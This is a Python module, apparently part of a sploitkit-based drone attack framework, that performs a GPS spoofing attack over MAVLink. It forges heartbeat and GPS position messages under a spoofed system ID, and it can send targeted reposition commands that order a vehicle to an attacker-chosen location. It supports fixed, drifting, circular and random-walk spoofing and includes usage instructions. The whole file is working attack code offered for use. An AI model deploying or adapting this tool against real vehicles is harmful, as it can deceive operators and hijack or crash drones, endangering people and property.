from sploitkit import Config, Option
import os
os.environ['MAVLINK20'] = '1'
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import math
import random
import signal


# Force MAVLink 2.0 (critical for proper message routing)


class GPSSpoofing(MAVLinkModule):
    """
    GPS Spoofing - Inject false GPS position data to mislead the GCS about vehicle location.

    Sends GLOBAL_POSITION_INT (vehicle position) and GPS_RAW_INT (GPS quality) messages.
    These are the standard messages that Ground Control Stations display on their maps.

    Optionally sends COMMAND_LONG with MAV_CMD_DO_REPOSITION for targeted attacks.

    Connection:
        For spoofing, use 'udpout:' to send TO the target port:
        - Network (recommended): udpout:192.168.1.1:14550
        - Network (bidirectional): udp:192.168.1.1:14550
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage (Broadcast Mode - default):
        set connection udpout:192.168.1.1:14550
        set mode fixed
        set latitude 37.7749
        set longitude -122.4194
        run

    Usage (Targeted Mode - shows target IDs in Wireshark):
        set connection udpout:192.168.1.1:14550
        set mode fixed
        set latitude 37.7749
        set longitude -122.4194
        set use_targeted_commands true
        set tgt_system_id 1
        set tgt_component_id 1
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='mode',
            description='Spoofing mode: fixed, drift, circle, path, random',
            required=False,
        ): "fixed",  # Default value
        Option(
            name='latitude',
            description='Spoofed latitude in decimal degrees (e.g., 37.7749)',
            required=True,
        ): "37.7749",  # Default: San Francisco
        Option(
            name='longitude',
            description='Spoofed longitude in decimal degrees (e.g., -122.4194)',
            required=True,
        ): "-122.4194",  # Default: San Francisco
        Option(
            name='altitude',
            description='Spoofed altitude in meters above sea level',
            required=False,
        ): "100",  # Default value
        Option(
            name='duration',
            description='Duration to spoof in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='GPS update rate in Hz (messages per second)',
            required=False,
        ): "5",  # Default value
        Option(
            name='satellites',
            description='Number of spoofed GPS satellites visible',
            required=False,
        ): "12",  # Default value
        Option(
            name='fix_type',
            description='GPS fix type: 0=No Fix, 2=2D, 3=3D, 4=DGPS, 5=RTK',
            required=False,
        ): "3",  # Default: 3D fix
        Option(
            name='speed',
            description='Movement speed in m/s (for drift/circle/random modes)',
            required=False,
        ): "5",  # Default value
        Option(
            name='radius',
            description='Circle radius in meters (for circle mode)',
            required=False,
        ): "50",  # Default value
        Option(
            name='src_system_id',
            description='Source system ID to spoof (what system the message appears from)',
            required=False,
        ): "1",  # Default: System 1
        Option(
            name='src_component_id',
            description='Source component ID to spoof (what component the message appears from)',
            required=False,
        ): "1",  # Default: Component 1
        Option(
            name='tgt_system_id',
            description='Target system ID (who to send to, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
        Option(
            name='tgt_component_id',
            description='Target component ID (which component to target, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
        Option(
            name='use_targeted_commands',
            description='Send targeted COMMAND_LONG messages (shows target IDs in Wireshark)',
            required=False,
        ): "false",  # Default: false (use broadcast telemetry only)
    })

    def send_heartbeat(self, master):
        """
        Send a heartbeat message to announce system presence.
        This is CRITICAL for GCS/MAVProxy to recognize and route messages.
        """
        master.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_QUADROTOR,
            mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            0,  # base_mode
            0,  # custom_mode
            0   # system_status
        )

    def send_targeted_position_command(self, master, lat, lon, alt, target_system, target_component):
        """
        Send a targeted COMMAND_LONG with MAV_CMD_DO_REPOSITION.
        This is a targeted message that has target_system and target_component fields.
        It commands the vehicle to reposition to the specified location.
        """
        ground_speed = -1  # -1 = use default
        bitmask = 0  # No special flags
        radius = 0  # Loiter radius
        yaw = float('nan')  # Keep current yaw

        # Send COMMAND_LONG with MAV_CMD_DO_REPOSITION
        master.mav.command_long_send(
            target_system,      # target_system (TARGETED)
            target_component,   # target_component (TARGETED)
            mavutil.mavlink.MAV_CMD_DO_REPOSITION,  # command
            0,                  # confirmation
            ground_speed,       # param1: ground speed (-1 = default)
            bitmask,            # param2: bitmask
            radius,             # param3: radius
            yaw,                # param4: yaw
            lat,                # param5: latitude (degrees)
            lon,                # param6: longitude (degrees)
            alt                 # param7: altitude (meters)
        )

    def send_global_position_int(self, master, lat, lon, alt, satellites, fix_type, use_targeted=False, target_system=0, target_component=0):
        """
        Send spoofed GPS data using GLOBAL_POSITION_INT and GPS_RAW_INT messages.
        GLOBAL_POSITION_INT shows vehicle position on GCS maps.
        GPS_RAW_INT shows GPS quality (satellites, fix type, etc.).

        Also sends HEARTBEAT messages (critical for GCS/MAVProxy recognition).
        Optionally sends COMMAND_LONG with MAV_CMD_DO_REPOSITION for targeted attacks.

        Note: GLOBAL_POSITION_INT and GPS_RAW_INT are broadcast messages and do not
        have target_system/target_component fields. If you need messages with target
        fields visible in Wireshark, set use_targeted=True to also send COMMAND_LONG.
        """
        # Convert to required units
        lat_int = int(lat * 1e7)  # Latitude in degrees * 1E7
        lon_int = int(lon * 1e7)  # Longitude in degrees * 1E7
        alt_msl = int(alt * 1000)  # Altitude above MSL in mm
        relative_alt = int(alt * 1000)  # Altitude above ground in mm (using same as MSL)

        # Get current time
        time_boot_ms = int(time.time() * 1000) % 4294967295  # Wrap at 32-bit limit
        time_usec = int(time.time() * 1e6)

        # Velocity components in cm/s (all zero for stationary)
        vx = 0  # Ground X speed (latitude direction) in cm/s
        vy = 0  # Ground Y speed (longitude direction) in cm/s
        vz = 0  # Ground Z speed (altitude direction) in cm/s

        # Heading in degrees * 100 (0 = north)
        hdg = 0  # 0 degrees (north)

        # Send HEARTBEAT first (crucial for GCS/MAVProxy to recognize system)
        self.send_heartbeat(master)

        # Send GLOBAL_POSITION_INT (vehicle position)
        # This is a broadcast message - no target fields exist
        master.mav.global_position_int_send(
            time_boot_ms,
            lat_int,
            lon_int,
            alt_msl,
            relative_alt,
            vx,
            vy,
            vz,
            hdg
        )

        # Send GPS_RAW_INT (GPS quality info)
        # This is also a broadcast message - no target fields exist
        eph = 100  # Horizontal dilution in cm (good accuracy)
        epv = 100  # Vertical dilution in cm (good accuracy)
        vel = 0    # Ground speed in cm/s
        cog = 0    # Course over ground in degrees * 100

        master.mav.gps_raw_int_send(
            time_usec,
            fix_type,
            lat_int,
            lon_int,
            alt_msl,
            eph,
            epv,
            vel,
            cog,
            satellites
        )

        # Optionally send targeted COMMAND_LONG for attacks requiring target fields
        if use_targeted and target_system > 0:
            self.send_targeted_position_command(master, lat, lon, alt, target_system, target_component)

    def calculate_new_position(self, lat, lon, bearing, distance):
        """
        Calculate new GPS position given bearing and distance.
        Uses Haversine formula.

        Args:
            lat: Current latitude in degrees
            lon: Current longitude in degrees
            bearing: Bearing in degrees (0-360)
            distance: Distance in meters

        Returns:
            (new_lat, new_lon) in degrees
        """
        R = 6371000  # Earth's radius in meters

        lat_rad = math.radians(lat)
        lon_rad = math.radians(lon)
        bearing_rad = math.radians(bearing)

        new_lat_rad = math.asin(
            math.sin(lat_rad) * math.cos(distance / R) +
            math.cos(lat_rad) * math.sin(distance / R) * math.cos(bearing_rad)
        )

        new_lon_rad = lon_rad + math.atan2(
            math.sin(bearing_rad) * math.sin(distance / R) * math.cos(lat_rad),
            math.cos(distance / R) - math.sin(lat_rad) * math.sin(new_lat_rad)
        )

        return math.degrees(new_lat_rad), math.degrees(new_lon_rad)

    def spoof_fixed(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, use_targeted=False, tgt_system=0, tgt_component=0):
        """
        Spoof GPS at a fixed position.
        """
        self.logger.info(f"Spoofing fixed position: {lat}, {lon}, {alt}m")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_global_position_int(master, lat, lon, alt, satellites, fix_type, use_targeted, tgt_system, tgt_component)
                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count} spoofed GPS packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_drift(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed, use_targeted=False, tgt_system=0, tgt_component=0):
        """
        Spoof GPS with gradual drift in a random direction.
        """
        bearing = random.uniform(0, 360)
        self.logger.info(f"Spoofing drifting position: Starting at {lat}, {lon}, bearing {bearing:.1f}°")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        current_lat = lat
        current_lon = lon

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_global_position_int(master, current_lat, current_lon, alt, satellites, fix_type, use_targeted, tgt_system, tgt_component)
                count += 1

                # Update position
                distance_per_update = speed / update_rate
                current_lat, current_lon = self.calculate_new_position(
                    current_lat, current_lon, bearing, distance_per_update
                )

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Final position: {current_lat:.6f}, {current_lon:.6f}")
        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_circle(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed, radius, use_targeted=False, tgt_system=0, tgt_component=0):
        """
        Spoof GPS moving in a circle around a center point.
        """
        self.logger.info(f"Spoofing circular path: Center {lat}, {lon}, radius {radius}m")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        # Calculate angular velocity (radians per second)
        circumference = 2 * math.pi * radius
        angular_velocity = (speed / radius) if radius > 0 else 0

        angle = 0

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                # Calculate position on circle
                current_lat, current_lon = self.calculate_new_position(
                    lat, lon, math.degrees(angle), radius
                )

                self.send_global_position_int(master, current_lat, current_lon, alt, satellites, fix_type, use_targeted, tgt_system, tgt_component)
                count += 1

                # Update angle
                angle += angular_velocity / update_rate
                if angle > 2 * math.pi:
                    angle -= 2 * math.pi

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def spoof_random(self, master, lat, lon, alt, satellites, fix_type, duration, update_rate, speed, use_targeted=False, tgt_system=0, tgt_component=0):
        """
        Spoof GPS with random walk movement.
        """
        self.logger.info(f"Spoofing random walk: Starting at {lat}, {lon}")

        interval = 1.0 / update_rate
        start_time = time.time()
        count = 0

        current_lat = lat
        current_lon = lon
        bearing = random.uniform(0, 360)

        stop_spoofing = False

        def signal_handler(sig, frame):
            nonlocal stop_spoofing
            stop_spoofing = True

        original_sigint = signal.signal(signal.SIGINT, signal_handler)

        try:
            while not stop_spoofing:
                if duration > 0 and (time.time() - start_time) > duration:
                    break

                self.send_global_position_int(master, current_lat, current_lon, alt, satellites, fix_type, use_targeted, tgt_system, tgt_component)
                count += 1

                # Update position with random bearing changes
                bearing += random.uniform(-30, 30)
                bearing = bearing % 360

                distance_per_update = speed / update_rate
                current_lat, current_lon = self.calculate_new_position(
                    current_lat, current_lon, bearing, distance_per_update
                )

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Position: {current_lat:.6f}, {current_lon:.6f} ({count} packets, {elapsed:.1f}s)")

                time.sleep(interval)

        finally:
            signal.signal(signal.SIGINT, original_sigint)

        self.logger.success(f"Final position: {current_lat:.6f}, {current_lon:.6f}")
        self.logger.success(f"Sent total of {count} spoofed GPS packets")

    def run(self):
        # Retrieve configuration options
        mode = self.config['mode'].lower()
        latitude = float(self.config['latitude'])
        longitude = float(self.config['longitude'])
        altitude = float(self.config['altitude'])
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])
        satellites = int(self.config['satellites'])
        fix_type = int(self.config['fix_type'])
        speed = float(self.config['speed'])
        radius = float(self.config['radius'])
        src_system_id = int(self.config['src_system_id'])
        src_component_id = int(self.config['src_component_id'])
        tgt_system_id = int(self.config['tgt_system_id'])
        tgt_component_id = int(self.config['tgt_component_id'])
        use_targeted = self.config['use_targeted_commands'].lower() in ['true', '1', 'yes']

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("GPS Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false GPS data into the MAVLink stream")
        self.logger.info(f"Mode: {mode}")
        self.logger.info(f"Starting coordinates: {latitude}, {longitude}")
        self.logger.info(f"Altitude: {altitude}m")
        self.logger.info(f"GPS Fix Type: {fix_type}")
        self.logger.info(f"Satellites: {satellites}")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        self.logger.info(f"Source: System ID {src_system_id}, Component ID {src_component_id}")

        if use_targeted:
            self.logger.success(f"Targeted Commands: ENABLED")
            self.logger.info(f"Target: System ID {tgt_system_id}, Component ID {tgt_component_id}")
            self.logger.info(f"Sending: GLOBAL_POSITION_INT, GPS_RAW_INT, and COMMAND_LONG (targeted)")
        else:
            self.logger.warning(f"Targeted Commands: DISABLED (broadcast only)")
            self.logger.warning(f"Note: GLOBAL_POSITION_INT and GPS_RAW_INT are broadcast messages")
            self.logger.warning(f"      Target IDs are ignored - set use_targeted_commands=true for targeting")

        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        master = None
        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed source and target IDs
            master.source_system = src_system_id
            master.source_component = src_component_id
            master.target_system = tgt_system_id
            master.target_component = tgt_component_id

            # Execute spoofing based on mode
            if mode == "fixed":
                self.spoof_fixed(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, use_targeted, tgt_system_id, tgt_component_id)

            elif mode == "drift":
                self.spoof_drift(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed, use_targeted, tgt_system_id, tgt_component_id)

            elif mode == "circle":
                self.spoof_circle(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed, radius, use_targeted, tgt_system_id, tgt_component_id)

            elif mode == "random":
                self.spoof_random(master, latitude, longitude, altitude, satellites, fix_type, duration, update_rate, speed, use_targeted, tgt_system_id, tgt_component_id)

            else:
                self.logger.error(f"Unknown mode: {mode}")
                self.logger.info("Supported modes: fixed, drift, circle, random")
                return

            self.logger.success(f"\n{separator}")
            self.logger.success("GPS Spoofing Attack Completed")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user.")
        except Exception as e:
            self.logger.error(f"Error during GPS spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
